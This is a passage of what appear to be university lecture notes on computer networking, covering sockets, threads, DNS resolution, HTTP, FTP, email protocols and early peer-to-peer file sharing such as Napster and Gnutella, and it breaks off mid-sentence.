This wrapping process is known as protocol encapsulation. Each
layer of the networking stack can ignore the headers outside of its
layer and treat anything from higher layers simply as part of the
payload that needs to be sent.There are two ways that network applications are structured: client-server and peer-to-peer.No matter what architecture is used, there is still a fundamental client-server
relationship. One system (a client) will send some request to another (a server).When we write network-aware applications, they need to use the network to communicate with
each other. These applications are no different than any other processes on the computer. Any
process can access the network and it is up to the operating system to coordinate this
access. When writing applications, the programmer will use a
set of interfaces referred to as a
Network API
(Application Programming Interface) to interact with the network and not worry about the lower
layers of the network.
For example, a programmer does not need to know about ethernet or IP
to communicate with another program but needs to have available the abstraction of being able to send data
from one logical port on an application to one on another application.The communication session is the conducted by the application layer protocol.
This is a definition of the valid sequence of requests, responses, and their respective message formats
for a particular network service. The protocol needs to be well-defined for applications to
be able to communicate with each other.Given a well-defined protocol, any application should be able to follow the rules of the protocol
and create messages that the other side can understand, regardless of the implementation language
or operating system. For instance, an iPad running an Swift should be able to talk to
a mail server written in Java running on a Windows platform.The Network API will have core services, such as those related to sending and
receiving data, that are provided by the operating system. These are augmented with libraries
to handle other functions, such as looking up names, converting data, and
simplifying certain operating-system interfaces.As programmers writing network-aware applications, we obviously need functions
for sending and receiving data but we may want to be able to specify something
about the behavior of that data over the network. For example:These are all legitimate desires. Unfortunately, IP gives us no control over
throughput, delay, jitter, and security. We can handle security at the application layer
and we will later examine mechanisms that were added to IP to support some degree of control
over packet delivery.Applications interact with IP’s transport layer.
There are two dominant transport-layer protocols on top of IP (IP is the network layer):
TCP and UDP (there are a few others, such as the SCTP, but these two dominate).TCP, the Transmission Control Protocol, provides
connection-oriented service.
This does not imply that an actual network connection is being set up as one would
for a circuit-switched network.
We are strictly talking about transport-layer services here. For layer 2 and layer 3
protocols, a connection refers to setting up a pre-defined route (circuit) and
providing that connection with guaranteed bandwidth. At the transport layer (4),
we still strive strive to provide the illusion of a reliable bidirectional
communication channel but it is all done in software on top of unreliable
datagrams (IP). At the transport layer, the software does not have any control
of the route that packets take or the bandwidth that is available to the connection.The TCP layer of software ensures that
packets are delivered in order to the application (buffering them in memory in the
operating system if any arrive out of order) and that lost or corrupt packets are
retransmitted. TCP keeps track of the destination so that the
application can have the illusion of a connected data stream (just keep
feeding data to the stream and don’t worry about addressing it). TCP provides
a full-duplex connection, meaning that both sides can send and
receive messages over the same link. TCP is stream oriented, meaning that
data is received as a continuous stream of bytes and there is no preservation
of message boundaries.UDP, the User Datagram Protocol is designed as a very thin
transport layer over IP. It provides connectionless service,
also known as datagram service. While UDP drops packets with
corrupt data, it does not ensure in-order delivery or reliable
delivery. UDP’s datagram service preserves message boundaries. If you send
n messages, you will receive n messages; they will not be combined into
one message.Port numbers in both TCP and UDP are used
to allow the operating system to direct the data to the appropriate application
or, more precisely, to the socket that is associated with the
communication stream on the application. A port number is just a 16-bit number
that is present in both TCP and UDP headers to identify a specific endpoint on a node.Sockets are an interface to the network provided to
applications by the operating system. They were created at the University of
California at Berkeley for 4.2BSD (a derivative of UNIX) in 1983
and most operating systems now support this interface.
The purpose of sockets is to provide a protocol-independent interface for applications
to communicate with each other. The underlying network does not have to by IP.
Once set up, the socket looks like a file descriptor for an open file. With connection-oriented
(e.g., TCP) sockets, you can use the regular file system read and write system
calls to receive and send data.Sockets are the mechanism that the operating system exposes to the user for accessing
the network.
A socket is created with the socket
system call and assigned a local address and port number with the bind system
call. The OS can fill in defaults if you do not want to specify a specific address and port.
(Note that you specify an address because your system might have multiple IP addresses; one for
each of its network interfaces). The socket also requires that the programmer identify
the address family for the socket (e.g., the protocol stack: IP, IP version 6, Bluetooth, local)
as well as the mode of communication (e.g., connection-oriented or datagrams).For connection-oriented protocols (TCP), a socket on a server can be set to
listen for connections with the listen system call. This turns it
into a listening socket. Its only purpose will now be to receive incoming connections. The accept
call waits for a connection on a listening socket.
It blocks until a connection is received, at which point the server receives
a new socket that is dedicated to that connection.A client establishes a connection with
the connect system call. After the connection is accepted by the server,
both sides now have a socket on which they can communicate.Sending and receiving data is
compatible with file operations: the same read/write system calls can be
used. Data communication is stream-oriented. A sender can transmit an
arbitrary number of bytes and there is no preservation of message boundaries.When communication is complete, the socket can be closed with the shutdown
or close system calls.With connectionless protocols, there is no need to establish a connection or to close one.
Hence, there is no need for the connect, listen, or shutdown
system calls.Unlike connection oriented sockets, data communication
is message-oriented.
A sender transmits a message. The size of the message is limited to the maximum
size allowable by the underlying network (the MTU, maximum transfer unit).Because you need to specify the destination as the operating system does not keep
state of a “connection”, new system calls were created for sending and receiving
messages.
The sendto and recvfrom system
calls are used to send and receive datagrams. sendto allows you to
send a datagram and specify its destination. recvfrom allows you to
receive a datagram and identify who sent it.Java provides many methods to deal with sockets and some commonly-used ones
consolidate the sequence of steps that need to be take place on the operating system.
The constructor for the ServerSocket class creates a socket for the TCP/IP protocol,
binds it to a specified port and host (using defaults if desired), and sets
that socket to the listening state.
A client’s Socket class constructor
creates a socket for the TCP/IP protocol, binds it to any available local port and host,
and connects to a specified host and port. It returns when the server accepts the connection.
The connected socket object allows you to acquire an InputStream and OutputStream for
communication.A process normally has one thread of execution, or flow of control.
A process may be multithreaded, where
the same program has multiple concurrent threads of execution.In a multi-threaded process, all of the process’ threads share the
same memory and open files. Within this shared memory, each thread
gets its own stack, which is where return addresses from functions are
placed and where local variables get allocated.
Each thread also has its own instruction pointer and registers.
Since memory is shared, it is important to note that there is
no memory protection among the threads in a process. Global variables
are freely accessible by all threads.
In particular, the heap, the pool of memory
that is used for dynamic memory allocation is shared and freely accessible
to all threads in the process. There are several benefits in using threads. Threads are more efficient than
processes.
The operating system does not need to create and manage a new memory map
for a new thread (as it does for a process). It also does not need to
allocate new structures to keep track of the state of open files and
increment reference counts on open file descriptors. Threading maps nicely
to multicore architectures and allows for the effective use of
multiple process cores.Threading also makes certain types of programming easy. While it’s true
that there is a potential for bugs because memory is shared among threads,
shared memory makes it trivial to share data among threads. The same
global and static variables can be read and written among all threads
in a process. For a network server process, threading is appealing because it
becomes easy to write code that handles multiple client requests at
the same time. A common programming model is to have one master thread
that waits for client connections and then dispatches a worker thread
to handle the request.While thread usage differs slightly among languages,
there always needs to be a mechanism to create a thread and to
wait for threads to exit.
When a thread is created, a specific method (function) is called
in that new execution flow. The original execution flow (the one thread
that started when the process began) continues normally.
When that thread eventually returns from that method, the thread terminates.
If a thread needs to wait for another thread, it can choose to block until the
other thread terminates. This is called a join. Because threads within a process share the same memory and hence share all global data (static variables,
global variables, and memory that is dynamically-allocated via malloc or new),
there is an opportunity for bugs to arise where multiple threads are reading and writing the same data
at the same time. A race condition is a bug
where the outcome of concurrent threads is unexpectedly dependent on
a specific sequence of thread scheduling.
Thread synchronization provides a way to ensure
mutual exclusion, where we can have regions of code that only
one thread can execute at a time.
Any other thread that tries to run in that region of code will go to sleep (be blocked) until the lock is
released when the current thread in that region leaves it.Java allows a synchronized keyword to be added to a method to ensure
that no more than one thread will be allowed to run in that method. If that degree of
control is too coarse, Java also allows the programmer to use the synchronized
keyword to define a region of code that will be locked by a variable called a
monitor object. Any other thread that tries to enter any region
of code that is synchronized by the same monitor object will be blocked. This region
of code that provides mutual exclusion is called a synchronized block.A node on the Internet is identified by its IP address.
For IP version 4, the most common version deployed today, an IP address is a 32-bit value
that is expressed as a set of four bytes, each as a decimal number and separated
by dots. For instance, the IP address of the Rutgers web server is 199.83.128.67.
[IP version 6, which is rapidly expanding as we are out of IPv4 addresses in some areas,
is a 128-bit value and is expressed as a set of 8 groups of four hexadecimal digits.]
As humans, however, we prefer to identify endpoints by name rather than by a number.
For example, we think of the Rutgers web server by its name, www.rutgers.edu.
We will now explore the management of IP domain names and IP addresses and converting between them.IP addresses are distributed hierarchically. At the very top level, an organization
called the IANA (Internet Assigned Numbers Authority)
is responsible for the entire set of IP addresses. It allocates blocks of addresses
to Regional Internet Registries (RIR).
There are five RIRs, each responsible for a part of the world’s geography. For instance,
the U.S. and Canada get addresses from ARIN,
the American Registry for Internet Numbers. Countries in Europe and the mid-East get addresses
from the RIPE Network Coordination Centre. These RIRs in turn allocate blocks of IP
addresses to ISPs within their region. Since ISPs are tiered, an ISP may allocate
a smaller block of addresses to a lower-tier ISP as well as to a company that subscribes
to its services. In the early days of the ARPANET, each machine had to have a globally unique name.
The Network Information Center (NIC) at the Stanford Research Institute (SRI)
kept the master list of machine names and their corresponding IP addresses.
This solution does not scale. As the number of hosts on the Internet grew larger,
a domain hierarchy was imposed on the name space. This created a
a tree-structured name space with name management delegated to the various nodes of the tree, where
each node is responsible for the names underneath it.
Rutgers, for example, can name a new machine on the Internet
anything it wants as long as the name is unique within Rutgers and is suffixed with rutgers.edu.
The textual representation of Internet domain names is a set of strings delimited
by periods with each set representing a level in the naming hierarchy. The rightmost string is
the highest level in the hierarchy. The hierarchy of Internet domain names has a single root under which are
top-level domains (TLDs). These are the .com, .edu, .org suffixes
that you are familiar with. Currently, there are 1,239 top-level domains.
They are divided into two categories: generic top-level domains and country-code top-level domains.Generic TLDs (gTLD) include the .com, .edu, .gov, .net, etc. domains.
Many of them date back to the first proposal of creating a domain hierarchy
RFC 920.
Each of these domain names is three or more characters long.
As the Internet became international, country-specific domains were created. These Country-code TLDs
(ccTLDs) are two-letter
ISO 3166
country codes (e.g., .ad for Andorra, .dk for Denmark, .es for Spain, .us for the U.S.A.).
The root of the domain hierarchy initially allowed only US-ASCII (Latin) characters.
This rule changed in 2009 and a
new set of Internationalized Domain Names for country code top-level domains
(IDN ccTLD) became available.
Examples of these domains are
السعودية. for Saudi Arabia, .рф for Russia, and .中國 for mainland China.
In 2011, internationalized domain names were approved for generic top-level domains (IDN gTLD),
giving us domains such as .みんな (“everyone” in Japanese), .移动 (“mobile” in Chinese), and
.дети (“kids” in Russian).Each top-level domain has one administrator assigned to it. The IANA keeps track of the organizations
that manage the various top-level domains. Until 1999, for example, a company called
Network Solutions Inc. operated the .com, .org, and .net registries. Until that time,
Network Solutions maintained the registry of names and processed registration requests
from customers. Since then, the process has been decentralized to support shared registration.
This allows multiple companies to provide domain registration services.
One company is still assigned by the IANA to be the keeper of the master list for a specific
top-level domain. This list of registered domain names for a particular TLD
is called the domain name registry.
The company that maintains this registry is called the
domain name registry operator, also known as the network information center (NIC).
The IANA keeps track of all these organizations.
A domain name registrar is a company that provides domain registration services
to customers, allowing
them to register domain names for a fee. There are approximately 2,124 of these companies.
Examples of these are GoDaddy (with over 60 million domains), Namecheap, eNom, and Tucows.When you pay GoDaddy, the registrar, $11.99 to register poobybrain.com, it consults the .com domain
name registry at Verisign, which is the registry operator for the .com domain.
If the domain name is available, GoDaddy becomes the designated registrar for that domain.
This means that Verisign knows that Go Daddy has information on the owner of poopybrain.com and that changes and
requests to transfer ownership or the registrar of your domain will have to come from that registrar.
Of the $11.99 that you paid GoDaddy, $7.85 went to Verisign as a registry fee (different TLDs have different
fees; .net registration costs $7.46). A $0.18 yearly fee that goes to ICANN to manage
the registry.We now saw how IP addresses are allocated and how domain names are registered. There is no
correlation between the two of them. A domain name does not imply a specific address and
adjacent IP address numbers may belong to completely different domain names.
We need a way to look up www.rutgers.edu and find out that its address is 199.83.128.67
since the IP layer knows absolutely nothing about domain names. Since the network
core has no interest in domain names, name-to-address resolution is handled at the
network edge, in the application before it establishes a socket connection. The
process of looking up a name is an application-layer protocol.In the past, Stanford Research Institute’s Network Information Center maintained the entire
list of hosts on the internet (in a hosts.txt file; /etc/hosts on Unix systems). This file
would be periodically downloaded by every system on the Internet.
Clearly, this solution was not sustainable. We already saw that it made managing unique names
problematic. Moreover, with millions of hosts on the Internet, there was a lot of churn
in this database. Downloading a new copy of every host on the Internet constantly just doesn’t make sense. The system that was put in place was a database of DNS servers
(Domain Name System servers). Like domain names themselves, DNS is a distributed,
hierarchical database. A DNS server is responsible for a managing a sub-tree in the domain name hierarchy. For example,
a server might be responsible for everything under rutgers.edu or even just the machines under
under cs.rutgers.edu. This sub-tree of a group of managed nodes is called a zone.
Each authoritative name server is responsible for answering
queries about its zone. The authoritative name server for
rutgers.edu is therefore responsible for the rutgers.edu zone. The question now is,
how do you find it?A DNS server accepts queries from clients (called questions) and provides
responses (called answers). By default, interactions with DNS servers use UDP for
improved performance, although TCP is almost always supported as well.Any DNS server can be found by starting at the top of the name hierarchy.
There are 13 root name servers that can provide a list of
authoritative name servers for all the top-level domains (you can
download the list of root name servers
here.
By contacting any one of these servers, you can find out the address
of a name server responsible for a specific top-level domain (such as .edu).
Then, by querying a name server for that domain (e.g., the .edu name server),
you can find a name server responsible for a name within that domain (such as rutgers.edu).
The process can continue until you find a name server that is responsible for the
zone that contains the host you need.There are two basic approaches for name resolution when dealing with a hierarchy of
name servers: iterative or recursive queries.
An iterative query is a single query to a name server. That server will return the
best answer it can with the knowledge it has. This can be the the information
configured for its zone (e.g., the domain names for which it is responsible) or
cached results. If it does not have an answer to the query, it may return a referral.
A referral is the name server for the next lower layer, taking you closer to your destination.
For example, the root server can return a referral to tell you how to get to the .edu name server.
A query to the .edu name server can return a referral to tell you how to get to the rutgers.edu name server.
The advantage of this approach is that each name server can be completely stateless.
It either knows the answer or it does not.With recursive resolution, the DNS server takes
on the responsibility of performing the set of iterative queries to other DNS servers
on behalf of the requestor and sends back a single answer.
With recursive resolution, a DNS server
may first send a query for the full domain name to the root name server.
The root name server will return a referral to, for example, the .edu name server.
A query to that server will then return a referral to the rutgers.edu name server.
In reality, the recursive server will cache past lookups so it will likely know
the addressses of recently-used top-level domains.The advantage of recursive resultion is that it
incurs less communication at the client, simplifies the client’s protocol, and
allows for caching of results at all the intermediate servers. The
disadvantage is that a recursive server has to keep state about the client’s request until
it has completed all processing and is ready to send a response back to the client.A DNS server is not obligated to support recursion.
Most top-level DNS servers, such as root servers, do not support recursive queries.The client interaction with DNS is via a DNS resolver. This is a
a DNS server that is not necessarily part of the DNS hierarchy (that is, it does
not have to be a server responsible for a zone). However, it is capable of taking
a recursive request from a client and performing a set of iterative queries,
going to the root servers if necessary, to get the result. Resolvers could be
hosted on the client, within the organization, or by third parties such
as Google Public DNS, or OpenDNS. Most ISPs provide a DNS resolver service.
Many systems (such as Windows and Linux platforms)
support extremely limited local DNS resolvers that are incapable of iterative queries
and simply talk to another DNS server (e.g., a resolver hosted by the customer’s ISP). These
limited DNS resolvers are called stub resolvers.DNS resolvers maintain a local cache of frequently used lookups
to avoid the overhead of repeated lookups for the same name and
to avoid the overhead of iterative queries. For example, it does not make sense to look up
the name server responsible for .com over and over for each query (it’s 192.5.6.30, by the way).Let us look at the sequence of operations that a query for www.cs.rutgers.edu might take from
an application. We assume that the client machine is configured to use OpenDNS
as a DNS resolver service.Rutgers registers its domain with educause.edu, the domain registrar for names in the edu TLD.
It provides Educause with a list of DNS servers that can answer queries for names underneath
rutgers.edu. Educause.edu, in turn, registers its DNS servers with ICANN, who is responsible
for the data in the root name servers.The client application contacts a local DNS stub resolver. This checks its
cache to see if it already has the answer. It also checks a local hosts file to
see if the answer is hard-coded in the configuration file. Giving up, it contacts
a real DNS resolver (e.g., OpenDNS at 208.67.222.222) and sends it a query for “www.rutgers.edu”.The OpenDNS resolver checks its cache and doesn’t know either, so it
contacts one of the root name servers (let’s assume the resolver’s cache is
completely empty). It sends a query of “www.cs.rutgers.edu” to the root server
198.41.0.4 (a.root_servers.net).The root server doesn’t have the answer but it knows the DNS server responsible
for the edu domain, so it sends a referral back to the OpenDNS
resolver giving it a list of name servers responsible for edu.The resolver now sends a query of “www.cs.rutgers.edu” to 192.41.162.32, one
of the edu name servers (a.edu-servers.net at 192.5.6.30). It does not know the answer either
but it does know the name servers for rutgers.edu, so it sends back
a referral with a list of those servers.The resolver now sends a query of “www.cs.rutgers.edu” to 192.230.122.7,
one of the rutgers.edu name servers (ns8.a1.incapsecuredns.net). This happens to be
an authoritative name server for the rutgers.edu zone and it
returns back the address, 128.6.4.24. If cs.rutgers.edu was defined as a separate zone,
the rutgers.edu DNS server would send a referral to yet another name server.The query is now complete and the OpenDNS resolver sends the result back
to the stub resolver that requested the query, which sends it back to the
client application.DNS servers store various information about domain names. Each datum is called
a resource record. A resource record contains a name, value, type of
record, and a time to live value.
Common records include:Address (A record): identifies the IP address for a given host name.Canonical name (CNAME record): identifies the real host name for an alias.
For example, www.cs.rutgers.edu is really a CNAME (alias) to
www3.srv.lcsr.rutgers.edu.Name server (NS record): identifies the authoritative name servers for the domain.Mail exchanger (MX record): identifies the mail server for a given host name.DNS uses a simple request-response protocol. Each query message from a client has
a corresponding response message from the server. The exact same binary message structure
is used for all DNS messages. A flag field identifies whether the message is a query
or a response and whether recursion is desired.
A variable-length set of fields after the fixed-length message header contains
questions (e.g., that you are looking for the A record of www.rutgers.edu) and
answers (the responses to the questions).As we mentioned earlier, DNS resolvers rely on caching to avoid performing the
same queries over and over. Every DNS zone contains a time to live
value, which is an estimate of how long it is safe for a resolver to keep the
results for that zone cached. For example, systems under rutgers.edu have a TTL of 3600 seconds
(1 hour) while systems under google.com have a TTL of 900 seconds (15 minutes).DNS servers are also able to take an IP address as a query and resolve a domain name for
the address.
Doing this requires a different query path: the edu server has no idea what range of IP
addresses were allocated to Rutgers; it just knows the name servers for Rutgers.A special domain, in-addr.arpa is created for reverse lookups
(arpa stands for Address & Routing Parameter Area).
The IP address to be queried is written in reverse order, with the first byte last, to construct a name
that looks like 24.4.6.128.in-addr.arpa for the address 128.6.4.24.An organization has a range, or several ranges, of IP addresses assigned to it.
It sets up a local DNS
server with PTR (pointer) records that map IP addresses to names.
It then tells its ISP what DNS servers are responsible for reverse DNS lookups.
The ISP knows what range of addresses belong to the organization. If it gets a query for
an address in that range, it now knows which name servers to send on a referral reply.
A reverse query that starts at the root will contact the root name servers.
These servers, in addition to knowing the name servers of TLDs, also know the
name servers for the five RIRs (ARIN, RIPE NCC, etc.) - the entities that hand out IP addresses.
The root server
may return a referral for the ARIN server (responsible for IP addresses in North America).
The ARIN server knows the blocks of IP addresses that were allocated to various ISPs
and will send a referral to the name server for the appropriate ISP. That ISP, when
queried, will then respond with a referral to the name server for the organization that
owns that address.HTTP stands for Hypertext Transfer Protocol
and is the web’s application-layer protocol for interacting between web browsers
and web servers.
It is a TCP, line-oriented, text-based protocol that consists of requests to the
server followed by responses from the servers.
The protocol is stateless. This means that the server does not
store any state from previous requests. This simplifies the design of the protocol,
simplifies recovery from crashes, and makes load balancing easier. Note that
web application that use HTTP may impose their own state but it is not a part
of the HTTP protocol.HTTP was originally designed to support non-persistent connections.
This meant that the connection was alive for only a single request-response interaction.
For each new request, the client had to re-establish a connection. That may have been fine in
the earliest days of the web but a request for a page is now typically accompanied
by multiple successive requests to download supporting files (stylesheet files and images). The overhead
of the round-trip time in setting up a connection for each piece of content adds up.
HTTP was enhanced to support persistent connections, where a client
and server can exchange multiple request-response interactions on the same connection.The main function of HTTP is to request objects (content). These are identified in a
browser
by a URL (Uniform Resource Locator). A URL takes the format:Browsers support various protocols, not just HTTP. Common ones include HTTP, HTTP (HTTP
that is made secure via SSL), FTP (file transfer protocol), and “file” (local files).
If the protocol is “http” or “https”, the browser process it via its HTTP protocol
module.The HTTP protocol comprises requests and responses. Each of these messages
is structured as a set of text headers, one per line, followed by a blank line,
and optionally followed by content. The first line of a request contains a command.
The three main HTTP requests are:GET: request an objectHEAD: like GET but download only the headers for the object.POST: upload a sequence of name/value pairs to the server. The
data is present in the body of the message and is often the response to a form.
An alternate way of uploading user data as a set of name/value pairs is
to use the GET command and place the data as a set of
parameters at the end of the URL. For example,
http://www.pk.org/test?name=paul&id=12345&ref=zzzEach HTTP response contains multiple headers, the first of which contains a status code and corresponding
message.While the HTTP protocol itself does not require keeping state, HTTP provides
a way for web servers to store state about past sessions from the browser.
It does this through cookies.
A cookie is a small amount of data that is associated with the web site.
The data is created by the server when it gets an HTTP request from the client.
It then sends that data back in a Set-Cookie line in the header of the HTTP response.
Future HTTP requests to the same server will contain a Cookie line in the header
and contain the data that is associated with the cookie.This simple mechanism allows a web server to create a database entry indexed by
a the cookie data to keep track of a user’s session. That database entry can include things such as
shopping cart contents, authentication state, pages visited, time spent on a page, etc.
The actual cookie itself does not need to store any of this; it just serves as a unique
key into the database table.Because a web page may contain content from other web sites (hence, other servers),
it is possible that requests to those sites will result in the generation of cookies.
A first-party cookie is one that comes from the web server that
is serving your page request.
A third-party cookie is one that comes from another web server that
serves some content that is present on the page you originally requested.
There has been concern over third party cookies in that they allow these parties,
usually advertisers, to track your visits to specific web sites. Most web browsers
block third-party cookies by default.Caching avoids the need to request the same content over and over from the server.
However, the challenge is to find out whether the content that is in the cache is
still valid. HTTP provides a conditional GET mechanism that
is triggered by two lines in the GET header.When a browser requests content from a server via an HTTP GET message, the
response headers include two lines. One is a Last-Modified
header that contains the timestamp of the last modification time of that
content. The second is a ETag header that contains a hash
of the content. The client stores both of these values along with the
copy of the content in its cache.When the content is requested again, the client issues an HTTP GET
request to the server but includes two lines in the headers. One
is an If-Modified-Since line that contains the last modification
time from the cache and the other is an If-None-Match
line that contains the value from the ETag. This allows the
server to check whether the content has changed since the
version that the client cached. If it did not, the server responds
with a Not Modified message and no content. If it did,
the server responds just as it would with a regular GET request.Caching does not need to be handled only by the web browser. A caching proxy is
an HTTP server that is hosted within a company’s LAN. All HTTP requests go to
that server instead of to the actual destinations (browsers allow you to define
a proxy server for some or all domains). The proxy server, in turn, passes the
request out to the requested server. This seems like an extra layer of overhead
(the client connects to the proxy and sends its request; the proxy then does the same).
However, the proxy can cache content. If you request content that somebody else
previously requested, it is likely to be cached and the organization incurs less
traffic on its outside Internet connection. Even pages that change frequently will
usually have significant portions that can be cached, such as CSS files, JavaScript files,
and supporting graphics.A web browser connects to a web server, issues an HTTP request for a web page (an
html file), and then parses it to see what additional objects need to be requested
to render the page. This typically includes multiple images, CSS files, and possibly
additional content such as JavaScript files. Requests are then issued for these objects.
One problem with issuing HTTP requests to a server one at a time is that one large
response (or a slow one) can hold up all other requests that the client will make.
This is called head-of-line blocking.One way to avoid head of line blocking is to have the browser open a separate TCP connection
for each HTTP request. There are several downsides to this. Many web pages have many dozens or
even hundreds of objects (think of a photo thumbnails gallery, for instance). Opening a large
number of connections can take substantial time. Moreover, it can consumer substantial resources
at the server since each connection requires kernel and application memory resources as well as CPU time.
Because of this, browsers support parallel connections but usually limit them to a small number
(typically four). Once you limit the number of connections, you again have the risk of head-of-line blocking.
Another problem with pipelining is that there’s no assurance that it will work
if a proxy is present. Just because your browser establishes several TCP connections to
the proxy does not mean that the proxy will, in turn, establish those connections to the server.Another performance optimization was HTTP pipelining. With pipelining, instead of waiting
for each response, multiple HTTP requests can be dispatched one after another over one connection.
However, the server is still obligated to issue responses in the order that the requests were
received and head-of-line blocking is still an issue since one delayed or long response can
hold up the responses behind it. Most browsers as well as proxies have disabled pipelining or do not implement it.HTTP/2, the next major update to the HTTP protocol, which came out in 2015, supports the same commands
as its predecessor, HTTP/1.1. However, it adds a number of optimizations.HTTP/2 supports multiplexing. This allows multiple messages to be interleaved on one connection. It
is a form of a session layer (implemented in the application, of course). A large response may be broken up
into multiple chunks with other responses interleaved among it. The browser keeps track of the pieces
and reassembles all the objects.The HTTP/2 protocol adds a server push capability that allows the server to send objects to the
client proactively. The client, upon receiving them, can add them to its cache. This is useful for
objects such as stylesheets that are used by an HTML page. Normally, the browser would have to
first receive the HTML page so it can parse it before issuing requests for objects that the page
needs. If this information is given to the server, it can start sending these objects before the
server requests them.HTTP request and response headers tend to be verbose and are text-based. Their size often requires
several round trips just to get the headers for a page out to the server. Compressing headers
can make requests and responses shorter and speed up page loads. FTP, the file transport protocol,
is one of the earliest Internet protocols and was designed to transfer files between computers.
The protocol uses TCP and is based on commands and responses.
A command is a single line of ASCII text. A response is also a single line
of text and contains a status code along with a message.To communicate, a client establishes a TCP connection from some available port N
to port 21 on the server. Commands and responses are sent over this communication
channel. Some basic commands are USER to identify a user name,
PASS to specify the password, GET to download
a file, PUT to upload a file, and DIR to get
a directory listing.If the command is a request for data transfer (such as putting a file, getting
a file, or getting a directory listing), the server initiates a TCP connection
back to the client on port N+1. Data is then transferred over this channel
(either from client to server or server to client, depending on the request) and the connection
is then closed. FTP is unique compared with most other protocols in that it separates
control and data channels. Control information is sent
out of band, on a different channel than the data.Because having a server connect to a client proved problematic in some environments,
FTP supports an alternate mechanism, called passive mode, where the
client connects to the server to set up the data channel. This is now the more popular
mode of operation and some FTP clients, such as web browsers, only support this mode.The Simple Mail Transfer Protocol (SMTP)
is designed for delivering mail to a server that hosts the recipient’s mailbox.
It is a TCP-based protocol that is line-based and uses ASCII text for all interactions.
An SMTP server acts as a client and a server.
Typically a mail application uses SMTP to send a message to a user’s SMTP server (e.g.,
smtp.gmail.com). This server is often hosted by the organization that provide’s the
sender’s email service (e.g., Google, Comcast, Rutgers). This SMTP server then queues
the message for delivery. To deliver the message, it acts like a client. The SMTP
server looks up the DNS MX (mail exchanger) record for the destination domain, connects
to that SMTP server, and delivers the message. The receiving server places the message
in the user’s mailbox. If the user has an account on that machine and runs the mail
client locally, the mail client can access the mailbox and read the message.
More often, the user is on a different system and needs to fetch messages. For that,
mail retrieval protocols, such as POP or IMAP, must be used.The SMTP protocol consists of server identification (HELO),
specifying who the mail is from (MAIL FROM:), and then specifying
one or more recipients, one per line (RCPT TO:). Finally, the
message is send with the DATA command. The message is multiple lines
of ASCII text and typically starts with the mail headers that you see in your email.
It is useful to note that all those mail headers are of no value to SMTP; it just
treats them as the message data. You can have a completely different list of names
in the To: header than you specified in the SMTP RCPT TO
commands and the mail will only be delivered to the recipients you listed
with the RCPT TO commands.SMTP is an example of a push protocol. The client takes content
and sends it to the server. HTTP, on the other hand, is a pull protocol.
The client connects to it and asks it for content.Because SMTP was designed to handle only text-based interaction, sending mail containing
binary data, such as a jpeg file, was problematic. To remedy this, an encoding format
called MIME (Multipurpose Internet Mail Extensions)
was created. This defines formats for encoding content in a suitable format for
message delivery. A MIME header in the body of the email identifies the content type
and encoding used. To support mail attachments and the encoding of multiple objects,
multipart MIME headers in the message body allow one to identify
multiple chunks of content. MIME has nothing to do with SMTP but is designed to
cope with the restrictions that SMTP placed on the structure of a message
(7-bit ASCII text with line breaks). It is up to mail clients to create and
parse MIME encodings.SMTP dealt only with mail delivery.
POP3 is a TCP-based protocol to allow a user to connect to a remote mailbox, download, and delete messages.
The entire protocol is text-based. A user authenticates with user and pass
commands and then sends commands to list messages, retrieve a specific message, or delete a message.POP3 supports two interaction models.
The download-and-delete model has a client connect to a mail server, download messages
to the client’s local mailbox, and then delete them from the server. With this model, the server is just
a temporary repository for mail until the client gets around to downloading it. The problem with this
model is that it does not work if you access mail from multiple devices. Once a message is deleted
from the server, other devices cannot get it.The download-and-keep model has the client connect to a mail server, download
messages to the client’s local mailbox, but does not delete them from the server. They only get
deleted when a user deletes them locally and the mail client connects back to the server and
issues a POP3 delete command for those messages. With this behavior, a user can access messages
from multiple devices.The downside of POP3 is that it does not keep state across sessions. It does not know, for example,
if a user marked several messages for deletion during a previous connection session.IMAP, the Internet Message Access Protocol
was designed to operate on a mailbox remotely rather than POP’s approach
of retrieving the contents of a mailbox onto a client. It can handle the
case where multiple clients are accessing the same mailbox and can
keep operations synchronized since state is maintained on the server.IMAP also supports the ability to move messages into folders,
search for specific messages on the server, mark messages for deletion
prior to actually deleting them, and fetch headers or full messages.
It allows the same offline convenience that POP does, where all content
can be downloaded onto a client, but also offers full state tracking
on the server.Like POP, SMTP, and HTTP, IMAP commands are also sent as lines of ASCII text.
Unlike those protocols, requests and responses can be handled asynchronously;
a client can send multiple requests without first waiting for responses.Traditional, and still the most common, network-based applications
are those that follow a client-server model. A client needs a
service (access to a file’s contents, for example) and contacts
a server that can provide that service.
A peer-to-peer model is an alternative application architecture
that removes the need for dedicated servers and enables each
host to participate in providing the service. Because all machines
can both access as well as provide the service, they are called peers.A true peer-to-peer architecture has no reliance on a central
server. In practice, some peer-to-peer architectures are really
hybrid architectures, where a central server may provide key
authentication or location services. Desirable (but not necessary)
characteristics of peer-to-peer application architectures are
robustness and self-scalability. Robustness refers to the ability
of the overall service to run even if some systems may be down.
Self-scalability refers to the ability of the system to handle
greater workloads as more peers are introduced into the system.In our discussions, we focused on just one application domain: peer-to-peer
file distribution.For file distribution, there are four key operations (primitives):
(1) how a peer joins and leaves a peer-to-peer system;
(2) how peers register files and their metadata (names, attributes);
(3) how search is handled;
and (4) how files are downloaded.The systems that we examine may or may not tackle all of these areas.Napster is the earliest of peer-to-peer systems and is the
system that put peer-to-peer file sharing on the map. It was
built for sharing MP3 files. Napster is not a pure peer-to-peer
architecture since it relies on a single server to keep track
of which peer has which content. A peer contacts the central server and publishes a list of files
that it wants to share. Anyone who wants to find a file contacts
the central server to get a list of peers that have the
file. The peer then connects to any of the peers in that list and
downloads the file. The download is either via a direct TCP
connection to the server or, if the system is inaccessible because
it is behind a firewall, it contacts the central server to send
a message to the desired peer requesting that it connect and upload to the
requestor.The advantage of Napster is that it is a simple design.
The use of a central server, while deviating from a true
peer-to-peer model, establishes a single point of control
and maintains all the information on the locations of content.The downside is that the server can become a bottleneck
with high query volumes. The failure of the central server
causes the entire system to cease to operate.After Napster was shut down by shutting down its central server,
Gnutella set out to create an architecture that offers truly
distributed file sharing. Unlike Napster, Gnutella can not be shut
down since there is no central server.Gnutella’s approach to finding content is based on query flooding.
When a peer joins the system, it needs to contact at least one other
Gnutella node and ask it for a list of nodes it knows about (its
“friends”). This list of peers becomes its list of connected
nodes. This builds an overlay network. An overlay network
is a logical network that is formed by peer connections. Each peer
knows of a limited set of other peers. These become its neighbors,
and do not need to be physical neighbors. A peer is capable of
communicating with any other peer; it is just the lack of knowing
that the other peer exists that stops it.To search for content, a peer sends a query message to its connected
nodes. Each node that receives a query will respond if it has
the content. Otherwise, it forwards the content to its connected
